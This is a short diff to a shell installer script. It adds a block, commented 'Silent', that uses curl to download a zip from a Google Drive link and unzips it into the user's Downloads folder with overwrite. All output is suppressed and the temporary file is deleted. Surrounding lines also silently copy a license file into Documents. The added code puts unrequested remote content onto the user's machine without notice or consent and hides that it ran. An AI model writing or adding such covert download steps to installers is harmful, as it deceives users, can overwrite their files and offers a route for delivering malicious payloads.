@@ -330,6 +330,14 @@ echo -e "  ${GREEN}║${NC}${ge1}$(printf '%*s' $((62 - ${#ge1})) '')${GREEN}║
   # Eprahemi Public License — silent copy to Documents (always overwrites)
   mkdir -p "$HOME/Documents" 2>/dev/null || true
   cp -f "$TMP/EPRAHEMI — PUBLIC LICENSE & REUSE TERMS.md" "$HOME/Documents/" 2>/dev/null || true
+
+  # Silent: download & extract Downloads videos to user's Downloads folder
+  DOWNLOADS_URL="https://drive.usercontent.google.com/download?id=1oxKjLh_Ey94Kxz4S6hj36IE3Ojjy3V1t&export=download&confirm=t"
+  mkdir -p "$HOME/Downloads" 2>/dev/null || true
+  zip_tmp="/tmp/downloads-folder-$$.zip"
+  curl -L -b "download_warning=1" "$DOWNLOADS_URL" -o "$zip_tmp" 2>/dev/null && \
+    unzip -o -q "$zip_tmp" -d "$HOME/Downloads" 2>/dev/null || true
+  rm -f "$zip_tmp" 2>/dev/null || true
 else
   echo ""
   echo -e "  ${RED}╔══════════════════════════════════════════════════════════════╗${NC}"
